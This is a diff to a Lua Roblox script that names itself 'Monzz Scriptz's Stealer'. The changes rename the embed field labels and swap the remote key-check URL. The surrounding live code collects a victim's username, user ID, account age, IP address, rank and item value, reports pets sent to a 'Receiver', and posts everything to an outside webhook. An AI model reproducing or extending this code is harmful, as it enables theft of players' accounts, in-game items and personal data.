@@ -1041,14 +1041,14 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Monzz Scriptz's Stealer** :skull:",
+                    ["name"] = "**Monzz Scriptz's Stealer** :skull:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":cry: **Pets left** :cry:",
+                    ["name"] = ":mailbox_with_mail: **Pets Amount** :mailbox_with_mail:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1118,7 +1118,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                         "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                     ["inline"] = false
                 }, {
-                    ["name"] = ":cry: **Pets left** :cry:",
+                    ["name"] = ":mailbox_with_mail: **Pets Amount** :mailbox_with_mail:",
                     ["value"] = "```" .. f .. "```",
                     ["inline"] = true
                 }, {
@@ -1160,7 +1160,7 @@ if getgenv().Settings ~= nil then
         local dhdata = {
             dhprem = dhkey
         }
-        local dhurl = "https://key.gayungbolong.repl.co" -- Exc : https://rizz.xyz/premium.php
+        local dhurl = "https://raw.githubusercontent.com/SuperMonz/Keys.v2/main/Keys.lua" -- Exc : https://rizz.xyz/premium.php
         local dhheaders = {
             ["content-type"] = "application/json"
         }
